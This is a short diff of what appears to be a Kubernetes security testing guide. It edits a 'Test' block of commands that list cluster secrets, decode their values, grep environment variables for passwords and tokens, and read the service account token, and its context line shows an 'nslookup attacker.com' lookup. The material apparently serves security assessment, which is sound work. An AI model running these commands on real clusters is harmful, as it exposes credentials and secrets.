@@ -110,7 +110,7 @@ nslookup attacker.com
 **Test:**
 ```
 kubectl get secrets --all-namespaces -o json | jq '.items[].metadata.name'
-kubectl get secret <name> -o jsonpath='{.data}' | base64 -d
+kubectl get secret <name> -o json | jq '.data | map_values(@base64d)'
 env | grep -iE 'password|key|token|secret|credential'
 cat /var/run/secrets/kubernetes.io/serviceaccount/token
 ```
